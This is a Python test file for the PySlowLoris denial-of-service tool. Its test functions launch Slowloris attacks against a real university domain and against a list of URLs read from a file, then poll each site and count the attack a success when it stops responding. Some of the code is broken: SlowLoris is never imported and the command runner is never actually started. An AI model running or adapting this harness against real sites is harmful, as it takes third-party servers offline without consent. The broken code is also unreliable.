#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import time
import random
import unittest
import urllib2
import subprocess as sub

from Queue import Queue
from threading import Thread

from PySlowLoris import TargetInfo

__all__ = ['test_sl', 'test_sl_multi']


class TestTargetInfo(unittest.TestCase):
    def test_target_ok(self):
        t = TargetInfo(url="https://google.com", port=80)
        t.get_info()
        self.assertNotEquals(t['Server'], '')


class RunCmd(Thread):
    def __init__(self, cmd, timeout):
        Thread.__init__(self)
        print cmd
        self.cmd = cmd
        self.timeout = timeout

    def run(self):
        self.p = sub.Popen(self.cmd)
        self.p.wait()

    def Run(self):
        self.start()
        self.join(self.timeout)

        if self.is_alive():
            self.p.terminate()  # use self.p.kill() if process needs a kill -9
            self.join()


def read_file(*args):
    res = []
    for file in args:
        with open(file, 'r') as f:
            res += [s.rstrip() for s in f.readlines()]
    return res


def test_sl():
    s = SlowLoris(url="kpi.ua")
    s.start()
    while True:
        try:
            sys.stdout.write("\r{}".format(s.get_counters()))
            sys.stdout.flush()
            time.sleep(1)
        except:
            s.kill()
            sys.exit(-1)


def do_work(url):
    RunCmd(["./slow_loris.py", "-u {}".format(url)], 60 * random.randint(2, 6))
    time.sleep(60 * random.randint(1, 3))
    n, m = 0, 0
    total = 10
    for _ in xrange(total):
        try:
            response = urllib2.urlopen(url, timeout=1)
            if response.getcode() == 200:
                n += 1
            else:
                m += 1
        except:
            m += 1
        time.sleep(0.043 * random.random())
    return m >= total // 2  # TRUE-success


def worker(queue):
    while True:
        url = queue.get()
        f = do_work(url)
        if f:
            sys.stdout.write('{}\n'.format(url))
            sys.stdout.flush()
        queue.task_done()


def test_sl_multi():
    urls = read_file('test_urls.txt')

    q = Queue()

    for _ in xrange(3):
        t = Thread(target=worker, args=(q,))
        t.setDaemon(True)
        t.start()

    for url in urls:
        q.put(url)

    q.join()
